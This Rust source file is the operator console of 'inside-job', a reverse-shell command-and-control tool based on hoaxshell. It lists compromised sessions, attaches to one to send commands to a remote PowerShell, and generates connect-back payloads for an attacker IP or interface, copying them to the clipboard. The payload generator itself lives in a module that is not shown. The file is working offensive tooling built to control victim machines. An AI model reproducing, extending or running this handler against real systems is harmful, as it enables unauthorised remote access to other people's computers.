use std::{time::SystemTime, borrow::Cow, net::Ipv4Addr, str::FromStr};
use clipboard::{ClipboardProvider, ClipboardContext};
use reedline::{Reedline, Signal, PromptEditMode, Prompt, PromptHistorySearchStatus, PromptViMode};
use uuid::Uuid;
use pnet::{datalink::{self, NetworkInterface}, ipnetwork::IpNetwork};
use crate::{APPLICATION, payload::{generate_payload, PayloadType}};

static LOGO: &'static str = "
            ┌───┐
──┬── ┬┐  ┬ │   │ ──┬── ┬──┐  ┬───┐           ┬ ┌───┐ ┬──┐
  │   │└┐ │ │   ┴   │   │  └┐ │               │ │   │ │  │
  │   │ │ │ └───┐   │   │   │ ┼──┼   ───      │ │   │ ┼──┴┐
  │   │ └┐│ ┬   │   │   │  ┌┘ │           ┬   │ │   │ │   │
──┴── ┴  └┴ │   │ ──┴── ┴──┘  ┴───┘       └───┘ └───┘ ┴───┘
            └───┘                     made by Julian Burger
                                         based on hoaxshell

";

#[derive(Debug)]
pub enum State {
    ALIVE,
    DEAD,
    UNKNOWN,
}

impl Default for State {
    fn default() -> Self {
        State::UNKNOWN
    }
}

pub struct Session {
    pub last_interaction: SystemTime,
    pub state: State,
    pub output_history: Vec<(String, SystemTime)>,
    pub input_history: Vec<(String, SystemTime)>,
    pub current_input: (String, bool),
    pub pwd: String,
    pub user: String,
}

impl Default for Session {
    fn default() -> Self {
        Self {
            last_interaction: SystemTime::now(),
            state: State::default(),
            output_history: Vec::new(),
            input_history: Vec::new(),
            current_input: ("".to_string(), false),
            pwd: "".to_string(),
            user: "".to_string(),
        }
    }
}

pub fn cli() {
    println!("{LOGO}");
    let mut active_session: Option<Uuid> = None;
    loop {
        match active_session {
            Some(_) => remote(&mut active_session),
            None => console(&mut active_session),
        }
    }
}

fn console(session_uuid: &mut Option<Uuid>) {
    let prompt = ConPrompt {};
    let mut line_editor = Reedline::create().with_ansi_colors(false);
    loop {
        match line_editor.read_line(&prompt) {
            Ok(Signal::Success(buffer)) => {
                let command = buffer.split(" ").collect::<Vec<&str>>();
                match command[0] {
                    "show" => show_sessions(),
                    "shell" => {
                        if command.len() == 2 {
                            if let Ok(uuid) = Uuid::parse_str(command[1]) {
                                if let Ok(app) = APPLICATION.lock() {
                                    if app.sessions.contains_key(&uuid) {
                                        *session_uuid = Some(uuid);
                                        return
                                    }
                                }
                            }
                            println!("Invalid UUID.");
                        } else {
                            println!("No UUID supplied.");
                        }
                    },
                    "payload" => {
                        if command.len() >= 2 {
                            if let Ok(addr) = Ipv4Addr::from_str(command[1]) {
                                let mut clipboard: ClipboardContext = ClipboardProvider::new().unwrap();
                                let payload: String;
                                if *command.get(2).unwrap_or(&"") == "-s" {
                                    payload = generate_payload(PayloadType::SECURE, addr);
                                } else {
                                    payload = generate_payload(PayloadType::UNSECURE, addr);
                                }
                                println!("{payload}");
                                match clipboard.set_contents(payload) {
                                    Ok(_) => println!("Copied to clipboard."),
                                    Err(_) => println!("Failed to copy to clipboard."),
                                }
                            } else {
                                let all = datalink::interfaces();
                                let interfaces = all.iter().filter(|i| i.name == command[1]).collect::<Vec<&NetworkInterface>>();
                                if interfaces.len() > 0 {
                                    let ip = interfaces[0].ips.iter().filter(|ip| ip.is_ipv4()).collect::<Vec<&IpNetwork>>();
                                    if ip.len() > 0 {
                                        if let Ok(addr) = Ipv4Addr::from_str(&ip[0].ip().to_string()) {
                                            let mut clipboard: ClipboardContext = ClipboardProvider::new().unwrap();
                                            let payload: String;
                                            if *command.get(2).unwrap_or(&"") == "-s" {
                                                payload = generate_payload(PayloadType::SECURE, addr);
                                            } else {
                                                payload = generate_payload(PayloadType::UNSECURE, addr);
                                            }
                                            println!("{payload}");
                                            match clipboard.set_contents(payload) {
                                                Ok(_) => println!("Copied to clipboard."),
                                                Err(_) => println!("Failed to copy to clipboard."),
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    "exit" => {
                        std::process::exit(0)
                    }
                    _ => {
                        
                    }
                }
            },
            Ok(Signal::CtrlC) | Ok(Signal::CtrlD) => {
                std::process::abort();
            }
            x => println!("Unexpected: {:?}", x),
        }
    }
}

fn remote(session_uuid: &mut Option<Uuid>) {
    let uuid = session_uuid.unwrap();
    let prompt = ShellPrompt(uuid);
    let mut line_editor = Reedline::create().with_ansi_colors(false);
    loop {
        match line_editor.read_line(&prompt) {
            Ok(Signal::Success(buffer)) => {
                let command = buffer.split(" ").collect::<Vec<&str>>();
                match command[0] {
                    "exit" => {
                        *session_uuid = None;
                        return
                    }
                    _ => {
                        if let Ok(mut app) = APPLICATION.lock() {
                            let session = app.sessions.get_mut(&uuid).unwrap();
                            session.current_input = (buffer, true);
                        }
                        std::thread::sleep(std::time::Duration::from_secs_f64(1.0));
                    }
                }
            },
            Ok(Signal::CtrlC) | Ok(Signal::CtrlD) => {
                std::process::abort();
            }
            x => println!("Unexpected: {:?}", x),
        }
    }
}

fn show_sessions() {
    if let Ok(app) = APPLICATION.lock() {
        if app.sessions.len() == 0 {
            println!("No sessions established :(");
            return
        }
        for (k, session) in app.sessions.iter() {
            println!("{:20} │ {:40} │ {:10}", k.to_string(), session.user, format!("{:?}", session.state))
        }
    }
}

struct ConPrompt;

impl Prompt for ConPrompt {
    fn render_prompt_left(&self) -> std::borrow::Cow<str> {
        Cow::Owned("inside-job".to_string())
    }

    fn render_prompt_right(&self) -> std::borrow::Cow<str> {
        Cow::Owned("".to_string())
    }

    fn render_prompt_indicator(&self, prompt_mode: PromptEditMode) -> std::borrow::Cow<str> {
        match prompt_mode {
            PromptEditMode::Default | PromptEditMode::Emacs => "> ".into(),
            PromptEditMode::Vi(vi_mode) => match vi_mode {
                PromptViMode::Normal => "> ".into(),
                PromptViMode::Insert => ": ".into(),
            },
            PromptEditMode::Custom(str) => format!("({})", str).into(),
        }
    }

    fn render_prompt_multiline_indicator(&self) -> std::borrow::Cow<str> {
        Cow::Borrowed(">>> ")
    }

    fn render_prompt_history_search_indicator(
        &self,
        history_search: reedline::PromptHistorySearch,
    ) -> std::borrow::Cow<str> {
        let prefix = match history_search.status {
            PromptHistorySearchStatus::Passing => "",
            PromptHistorySearchStatus::Failing => "failing ",
        };
        Cow::Owned(format!(
            "({}reverse-search: {}) ",
            prefix, history_search.term
        ))
    }
}

struct ShellPrompt(Uuid);

impl Prompt for ShellPrompt {
    fn render_prompt_left(&self) -> std::borrow::Cow<str> {
        if let Ok(app) = APPLICATION.lock() {
            let session = app.sessions.get(&self.0).unwrap();
            Cow::Owned(format!("[{:?}][{}] -> PS {}", session.state, session.user, session.pwd))
        } else {
            Cow::Owned("".to_string())
        }
    }

    fn render_prompt_right(&self) -> std::borrow::Cow<str> {
        Cow::Owned("".to_string())
    }

    fn render_prompt_indicator(&self, prompt_mode: PromptEditMode) -> std::borrow::Cow<str> {
        match prompt_mode {
            PromptEditMode::Default | PromptEditMode::Emacs => "> ".into(),
            PromptEditMode::Vi(vi_mode) => match vi_mode {
                PromptViMode::Normal => "> ".into(),
                PromptViMode::Insert => ": ".into(),
            },
            PromptEditMode::Custom(str) => format!("({})", str).into(),
        }
    }

    fn render_prompt_multiline_indicator(&self) -> std::borrow::Cow<str> {
        Cow::Borrowed(">>> ")
    }

    fn render_prompt_history_search_indicator(
        &self,
        history_search: reedline::PromptHistorySearch,
    ) -> std::borrow::Cow<str> {
        let prefix = match history_search.status {
            PromptHistorySearchStatus::Passing => "",
            PromptHistorySearchStatus::Failing => "failing ",
        };
        Cow::Owned(format!(
            "({}reverse-search: {}) ",
            prefix, history_search.term
        ))
    }
}